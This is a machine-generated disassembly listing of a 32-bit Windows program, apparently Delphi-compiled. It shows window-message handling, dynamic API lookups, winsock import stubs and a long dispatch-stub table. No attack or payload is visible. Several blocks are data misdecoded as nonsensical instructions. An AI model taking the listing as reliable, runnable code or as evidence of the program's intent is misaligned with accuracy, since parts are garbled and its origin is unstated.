mov [ fs : eax ] edx
push sub_452415
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41e7fc
retn
sub_45240e
jmp sub_4039d0
sub_452415
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4525d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_452344
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45283c
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_44a62c
sub_452927
jmp sub_4039d0
sub_45292e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452934
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45211c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45298c
call sub_4536b4
retn
sub_452dd9
jmp sub_4039d0
sub_452de0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4530dc
jmp sub_40371c
sub_453478
jmp sub_40371c
sub_453571
jmp sub_4039d0
sub_453578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453595
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_45358e
jmp sub_4039d0
sub_453595
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45359c
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_4229c8
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44ffe4
sub_4535bc
call sub_403294
retn
sub_453614
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45367a
jmp sub_4039d0
j_sub_40371c#9
jmp sub_40371c
sub_453854
xor edx edx
call sub_450348
retn
sub_45385c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_450348
mov eax ebx
call sub_437a0c
pop ebx
retn
sub_4538e2
jmp sub_4039d0
sub_4538e9
pop ebx
pop ecx
pop ebp
retn
sub_4538f0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_43df6c
push eax
call PostMessageA
pop ebx
retn
sub_453af4
jmp sub_4039d0
sub_453b95
jmp sub_4039d0
sub_453b9f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453bbe
mov eax [ rw-data ]
call sub_455dd8
retn
sub_453bb7
jmp sub_4039d0
sub_453bbe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453bdb
lea eax [ ebp - 0x20 ]
call sub_404050
retn
sub_453bd4
jmp sub_4039d0
sub_453bdb
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453cbc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_436bb8
retn
mov edx eax
mov eax [ rw-data ]
call sub_45542c
retn
sub_454040
mov edx eax
mov eax [ rw-data ]
call sub_456e4c
mov al 0x1
retn
sub_454128
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_454050
sub_45413c
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_454050
sub_454150
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_454050
sub_454164
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_454050
sub_454178
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_4542e3
jmp sub_4039d0
sub_4542ea
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4542f0
push ebx
mov ebx eax
mov eax ebx
call sub_43c884
mov eax ebx
call sub_43ca08
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4538f0
sub_454566
jmp sub_4039d0
sub_45456d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454574
push ebx
mov ebx edx
mov edx ebx
call sub_43ccec
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_436cc0
pop ebx
retn
sub_4545c8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_454630
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4545e0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_454630
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4545fc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_454630
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_454614
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_454630
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4548b0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548bc
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548c8
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548d4
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548e0
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548ec
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_414170
pop esi
pop ebx
retn
sub_45490c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_454928
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414170
pop esi
pop ebx
retn
sub_45493c
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_454944
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414170
pop esi
pop ebx
retn
sub_454958
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_454a34
mov eax [ eax + 0x54 ]
call sub_414014
retn
sub_454a40
mov eax [ eax + 0x54 ]
call sub_41430c
retn
sub_454c93
jmp sub_4039d0
sub_454cd7
jmp sub_4039d0
sub_454cde
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_454d2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454b2c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_4040a4
pop esi
pop ebx
retn
sub_454d98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_414170
pop esi
pop ebx
retn
sub_454dac
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_454fb1
jmp sub_4039d0
sub_454fb8
pop ebx
mov esp ebp
pop ebp
retn
sub_454fc0
inc [ eax + 0x8c ]
retn
sub_454fc8
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_454fe8
sub_454fe8
xor edx edx
call sub_45542c
retn
sub_45541e
jmp sub_4039d0
sub_4554a5
jmp sub_4039d0
sub_4554b4
add eax 0x30
call sub_40d19c
retn
sub_4554f8
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_40371c#8
jmp sub_40371c
sub_45554e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_455c1d
jmp sub_4039d0
sub_455c24
pop ebx
mov esp ebp
pop ebp
retn
sub_455dac
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_455dd8
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_455e04
xor edx edx
call sub_455cfc
retn
sub_455e0c
mov dl 0x1
call sub_455cfc
retn
sub_455e80
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_455e98
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_455f65
jmp sub_4039d0
sub_455f6c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4566b6
jmp sub_40371c
sub_456cb4
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_456d0a
jmp sub_40371c
j_sub_40371c#7
jmp sub_40371c
sub_456e2a
jmp sub_4039d0
sub_456e31
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456e38
call sub_40cbac
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_457031
jmp sub_4039d0
sub_457038
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4570ff
jmp sub_4039d0
sub_457106
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4572dc
jmp sub_4039d0
sub_4572e3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457344
jmp sub_4039d0
sub_45734b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457354
call sub_45711c
retn
j_sub_40371c#6
jmp sub_40371c
sub_457598
jmp sub_4039d0
sub_45759f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4576cd
jmp sub_4039d0
sub_45782c
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_457b2b
jmp sub_4039d0
sub_457b5a
jmp sub_4039d0
sub_457c66
jmp sub_4039d0
sub_457c6d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457ffe
jmp sub_4039d0
sub_458005
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458048
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_458178
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4581c3
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_4581d4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_4581e4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_458257
jmp sub_4039d0
sub_45825e
pop ebp
retn
sub_458260
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4581f4
call sub_403da0
call sub_458178
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44ded4
call sub_413c64
closesocket
jmp [ __import_lookup_table_15(wsock32:closesocket) ]
connect
jmp [ __import_lookup_table_15(wsock32:connect) ]
htons
jmp [ __import_lookup_table_15(wsock32:htons) ]
inet_addr
jmp [ __import_lookup_table_15(wsock32:inet_addr) ]
ioctlsocket
jmp [ __import_lookup_table_15(wsock32:ioctlsocket) ]
ntohs
jmp [ ntohs@IAT ]
shutdown
jmp [ shutdown@IAT ]
socket
jmp [ socket@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
getservbyname
jmp [ getservbyname@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ __import_lookup_table_15(wsock32:WSACleanup) ]
sub_458331
jmp sub_4039d0
sub_458338
pop ebp
retn
sub_45833c
sub [ rw-data ] 0x1
retn
sub_458bd0
push ebx
mov ebx eax
call WSAGetLastError
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_458bec
push ebx
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
retn
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_458c08
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_458c3c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_458c54
push esi
push edi
mov edi edx
inc edx
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov si 0xffed
call sub_403490
sub_458e25
jmp sub_4039d0
sub_458e2c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_458fa9
jmp sub_4039d0
sub_458fb0
pop ebx
pop ecx
pop ebp
retn
sub_459015
jmp sub_4039d0
sub_45901c
pop ebx
pop ecx
pop ebp
retn
sub_459081
jmp sub_4039d0
sub_459088
pop ebx
pop ecx
pop ebp
retn
sub_4590ed
jmp sub_4039d0
sub_4590f4
pop ebx
pop ecx
pop ebp
retn
sub_4591e8
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_459208
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_459274
push rw-data
push 0x101
call WSAStartup
test eax eax
je r-xdata
retn
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_4592b4
call WSACleanup
test eax eax
je r-xdata
retn
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_459314
jmp sub_4039d0
sub_45931b
pop ebp
retn
sub_459320
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_459274
sub_459ef9
jmp sub_4039d0
sub_459f00
pop ebp
retn
sub_459f04
sub [ rw-data ] 0x1
retn
sub_45a259
jmp sub_4039d0
sub_45a260
pop ebp
retn
sub_45a264
sub [ rw-data ] 0x1
retn
sub_45a384
jmp sub_4039d0
sub_45a3bc
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_45b21c
sub_45a3d8
mov eax 0x0
call sub_45b168
jmp eax
sub_45a3e4
retn
sub_45a3e8
mov eax 0x1
call sub_45b168
jmp eax
sub_45a3f4
retn
sub_45a3f8
mov eax 0x2
call sub_45b168
jmp eax
sub_45a404
retn
sub_45a408
mov eax 0x3
call sub_45b168
jmp eax
sub_45a414
retn
sub_45a418
mov eax 0x4
call sub_45b168
jmp eax
sub_45a424
retn
sub_45a428
mov eax 0x5
call sub_45b168
jmp eax
sub_45a434
retn
sub_45a438
mov eax 0x6
call sub_45b168
jmp eax
sub_45a444
retn
sub_45a448
mov eax 0x7
call sub_45b168
jmp eax
sub_45a454
retn
sub_45a458
mov eax 0x8
call sub_45b168
jmp eax
sub_45a464
retn
sub_45a468
mov eax 0x9
call sub_45b168
jmp eax
sub_45a474
retn
sub_45a478
mov eax 0xa
call sub_45b168
jmp eax
sub_45a484
retn
sub_45a488
mov eax 0xb
call sub_45b168
jmp eax
sub_45a494
retn
sub_45a498
mov eax 0xc
call sub_45b168
jmp eax
sub_45a4a4
retn
sub_45a4a8
mov eax 0xd
call sub_45b168
jmp eax
sub_45a4b4
retn
sub_45a4b8
mov eax 0xe
call sub_45b168
jmp eax
sub_45a4c4
retn
sub_45a4c8
mov eax 0xf
call sub_45b168
jmp eax
sub_45a4d4
retn
sub_45a4d8
mov eax 0x10
call sub_45b168
jmp eax
sub_45a4e4
retn
sub_45a4e8
mov eax 0x11
call sub_45b168
jmp eax
sub_45a4f4
retn
sub_45a4f8
mov eax 0x12
call sub_45b168
jmp eax
sub_45a504
retn
sub_45a508
mov eax 0x13
call sub_45b168
jmp eax
sub_45a514
retn
sub_45a518
mov eax 0x14
call sub_45b168
jmp eax
sub_45a524
retn
sub_45a528
mov eax 0x15
call sub_45b168
jmp eax
sub_45a534
retn
sub_45a538
mov eax 0x16
call sub_45b168
jmp eax
sub_45a544
retn
sub_45a548
mov eax 0x17
call sub_45b168
jmp eax
sub_45a554
retn
sub_45a558
mov eax 0x18
call sub_45b168
jmp eax
sub_45a564
retn
sub_45a568
mov eax 0x19
call sub_45b168
jmp eax
sub_45a574
retn
sub_45a578
mov eax 0x1a
call sub_45b168
jmp eax
sub_45a584
retn
sub_45a588
mov eax 0x1b
call sub_45b168
jmp eax
sub_45a594
retn
sub_45a598
mov eax 0x1c
call sub_45b168
jmp eax
sub_45a5a4
retn
sub_45a5a8
mov eax 0x1d
call sub_45b168
jmp eax
sub_45a5b4
retn
sub_45a5b8
mov eax 0x1e
call sub_45b168
jmp eax
sub_45a5c4
retn
sub_45a5c8
mov eax 0x1f
call sub_45b168
jmp eax
sub_45a5d4
retn
sub_45a5d8
mov eax 0x20
call sub_45b168
jmp eax
sub_45a5e4
retn
sub_45a5e8
mov eax 0x21
call sub_45b168
jmp eax
sub_45a5f4
retn
sub_45a5f8
mov eax 0x22
call sub_45b168
jmp eax
sub_45a604
retn
sub_45a608
mov eax 0x23
call sub_45b168
jmp eax
sub_45a614
retn
sub_45a618
mov eax 0x24
call sub_45b168
jmp eax
sub_45a624
retn
sub_45a628
mov eax 0x25
call sub_45b168
jmp eax
sub_45a634
retn
sub_45a638
mov eax 0x26
call sub_45b168
jmp eax
sub_45a644
retn
sub_45a648
mov eax 0x27
call sub_45b168
jmp eax
sub_45a654
retn
sub_45a658
mov eax 0x28
call sub_45b168
jmp eax
sub_45a664
retn
sub_45a668
mov eax 0x29
call sub_45b168
jmp eax
sub_45a674
retn
sub_45a678
mov eax 0x2a
call sub_45b168
jmp eax
sub_45a684
retn
sub_45a688
mov eax 0x2b
call sub_45b168
jmp eax
sub_45a694
retn
sub_45a698
mov eax 0x2c
call sub_45b168
jmp eax
sub_45a6a4
retn
sub_45a6a8
mov eax 0x2d
call sub_45b168
jmp eax
sub_45a6b4
retn
sub_45a6b8
mov eax 0x2e
call sub_45b168
jmp eax
sub_45a6c4
retn
sub_45a6c8
mov eax 0x2f
call sub_45b168
jmp eax
sub_45a6d4
retn
sub_45a6d8
mov eax 0x30
call sub_45b168
jmp eax
sub_45a6e4
retn
sub_45a6e8
mov eax 0x31
call sub_45b168
jmp eax
sub_45a6f4
retn
sub_45a6f8
mov eax 0x32
call sub_45b168
jmp eax
sub_45a704
retn
sub_45a708
mov eax 0x33
call sub_45b168
jmp eax
sub_45a714
retn
sub_45a718
mov eax 0x34
call sub_45b168
jmp eax
sub_45a724
retn
sub_45a728
mov eax 0x35
call sub_45b168
jmp eax
sub_45a734
retn
sub_45a738
mov eax 0x36
call sub_45b168
jmp eax
sub_45a744
retn
sub_45a748
mov eax 0x37
call sub_45b168
jmp eax
sub_45a754
retn
sub_45a758
mov eax 0x38
call sub_45b168
jmp eax
sub_45a764
retn
sub_45a768
mov eax 0x39
call sub_45b168
jmp eax
sub_45a774
retn
sub_45a778
mov eax 0x3a
call sub_45b168
jmp eax
sub_45a784
retn
sub_45a788
mov eax 0x3b
call sub_45b168
jmp eax
sub_45a794
retn
sub_45a798
mov eax 0x3c
call sub_45b168
jmp eax
sub_45a7a4
retn
sub_45a7a8
mov eax 0x3d
call sub_45b168
jmp eax
sub_45a7b4
retn
sub_45a7b8
mov eax 0x3e
call sub_45b168
jmp eax
sub_45a7c4
retn
sub_45a7c8
mov eax 0x3f
call sub_45b168
jmp eax
sub_45a7d4
retn
sub_45a7d8
mov eax 0x40
call sub_45b168
jmp eax
sub_45a7e4
retn
sub_45a7e8
mov eax 0x41
call sub_45b168
jmp eax
sub_45a7f4
retn
sub_45a7f8
mov eax 0x42
call sub_45b168
jmp eax
sub_45a804
retn
sub_45a808
mov eax 0x43
call sub_45b168
jmp eax
sub_45a814
retn
sub_45a818
mov eax 0x44
call sub_45b168
jmp eax
sub_45a824
retn
sub_45a828
mov eax 0x45
call sub_45b168
jmp eax
sub_45a834
retn
sub_45a838
mov eax 0x46
call sub_45b168
jmp eax
sub_45a844
retn
sub_45a848
mov eax 0x47
call sub_45b168
jmp eax
sub_45a854
retn
sub_45a858
mov eax 0x48
call sub_45b168
jmp eax
sub_45a864
retn
sub_45a868
mov eax 0x49
call sub_45b168
jmp eax
sub_45a874
retn
sub_45a878
mov eax 0x4a
call sub_45b168
jmp eax
sub_45a884
retn
sub_45a888
mov eax 0x4b
call sub_45b168
jmp eax
sub_45a894
retn
sub_45a898
mov eax 0x4c
call sub_45b168
jmp eax
sub_45a8a4
retn
sub_45a8a8
mov eax 0x4d
call sub_45b168
jmp eax
sub_45a8b4
retn
sub_45a8b8
mov eax 0x4e
call sub_45b168
jmp eax
sub_45a8c4
retn
sub_45a8c8
mov eax 0x4f
call sub_45b168
jmp eax
sub_45a8d4
retn
sub_45a8d8
mov eax 0x50
call sub_45b168
jmp eax
sub_45a8e4
retn
sub_45a8e8
mov eax 0x51
call sub_45b168
jmp eax
sub_45a8f4
retn
sub_45a8f8
mov eax 0x52
call sub_45b168
jmp eax
sub_45a904
retn
sub_45a908
mov eax 0x53
call sub_45b168
jmp eax
sub_45a914
retn
sub_45a918
mov eax 0x54
call sub_45b168
jmp eax
sub_45a924
retn
sub_45a928
mov eax 0x55
call sub_45b168
jmp eax
sub_45a934
retn
sub_45a938
mov eax 0x56
call sub_45b168
jmp eax
sub_45a944
retn
sub_45a948
mov eax 0x57
call sub_45b168
jmp eax
sub_45a954
retn
sub_45a958
mov eax 0x58
call sub_45b168
jmp eax
sub_45a964
retn
sub_45a968
mov eax 0x59
call sub_45b168
jmp eax
sub_45a974
retn
sub_45a978
mov eax 0x5a
call sub_45b168
jmp eax
sub_45a984
retn
sub_45a988
mov eax 0x5b
call sub_45b168
jmp eax
sub_45a994
retn
sub_45a998
mov eax 0x5c
call sub_45b168
jmp eax
sub_45a9a4
retn
sub_45a9a8
mov eax 0x5d
call sub_45b168
jmp eax
sub_45a9b4
retn
sub_45a9b8
mov eax 0x5e
call sub_45b168
jmp eax
sub_45a9c4
retn
sub_45a9c8
mov eax 0x5f
call sub_45b168
jmp eax
sub_45a9d4
retn
sub_45a9d8
mov eax 0x60
call sub_45b168
jmp eax
sub_45a9e4
retn
sub_45a9e8
mov eax 0x61
call sub_45b168
jmp eax
sub_45a9f4
retn
sub_45a9f8
mov eax 0x62
call sub_45b168
jmp eax
sub_45aa04
retn
sub_45aa08
mov eax 0x63
call sub_45b168
jmp eax
sub_45aa14
retn
sub_45aa18
mov eax 0x64
call sub_45b168
jmp eax
sub_45aa24
retn
sub_45aa28
mov eax 0x65
call sub_45b168
jmp eax
sub_45aa34
retn
sub_45aa38
mov eax 0x66
call sub_45b168
jmp eax
sub_45aa44
retn
sub_45aa48
mov eax 0x67
call sub_45b168
jmp eax
sub_45aa54
retn
sub_45aa58
mov eax 0x68
call sub_45b168
jmp eax
sub_45aa64
retn
sub_45aa68
mov eax 0x69
call sub_45b168
jmp eax
sub_45aa74
retn
sub_45aa78
mov eax 0x6a
call sub_45b168
jmp eax
sub_45aa84
retn
sub_45aa88
mov eax 0x6b
call sub_45b168
jmp eax
sub_45aa94
retn
sub_45aa98
mov eax 0x6c
call sub_45b168
jmp eax
sub_45aaa4
retn
sub_45aaa8
mov eax 0x6d
call sub_45b168
jmp eax
sub_45aab4
retn
sub_45aab8
mov eax 0x6e
call sub_45b168
jmp eax
sub_45aac4
retn
sub_45aac8
mov eax 0x6f
call sub_45b168
jmp eax
sub_45aad4
retn
sub_45b20b
jmp sub_4039d0
sub_45b212
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b30d
jmp sub_4039d0
sub_45b314
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45b378
jmp sub_4039d0
sub_45b37f
pop ebp
retn
sub_45b384
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_45b21c
sub_45b3b9
jmp sub_4039d0
sub_45b3c0
pop ebp
retn
sub_45b3c4
sub [ rw-data ] 0x1
retn
sub_45b650
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_45b65c
retn
sub_45b703
jmp sub_4039d0
sub_45b70a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45b762
jmp sub_4039d0
sub_45b769
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b770
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45b790
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_45bc0e
jmp sub_4039d0
sub_45bc15
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bd07
jmp sub_4039d0
sub_45bd0e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45bd9c
jmp sub_4039d0
sub_45bda3
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45bdd1
jmp sub_4039d0
sub_45bdd8
pop ebp
retn
sub_45bddc
sub [ rw-data ] 0x1
retn
sub_45beee
inc ebp
add [ ebx + eax * 8 ] bh
inc ebp
add [ eax - 0x2fffba3c ] bh
lds eax [ ebp ]
in al dx
lds eax [ ebp ]
pop eax
mov [ ebp ] 0xa8
mov [ ebp ] 0x68

sub_45bfb3
jpe r-xdata
cli
inc esi
add eax rw-data
add [ ebx ] esi
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_45bfdd
lea eax [ ebp - 0x194 ]
call sub_404050
retn
sub_45bfd6
jmp sub_4039d0
sub_45bfdd
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45c0b8
jmp sub_4039d0
sub_45c0bf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c1d0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c314
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c3c7
jmp sub_4039d0
sub_45c3ce
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_45c4a9
jmp sub_4039d0
sub_45c4b0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c69c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c6a8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_45c6c0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c6cc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_403848#6
jmp sub_403848
sub_45c7a5
jmp sub_4039d0
sub_45c7ac
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_40371c#4
jmp sub_40371c
sub_45c8d5
jmp sub_4039d0
sub_45c8dc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c8e8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c8f4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c99a
jmp sub_4039d0
sub_45c9a1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ca5d
jmp sub_4039d0
sub_45ca64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca81
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_45ca7a
jmp sub_4039d0
sub_45ca81
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45cb4f
jmp sub_4039d0
sub_45cb56
pop ebx
mov esp ebp
pop ebp
retn
sub_45cb5f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45cc02
jmp sub_4039d0
sub_45cc09
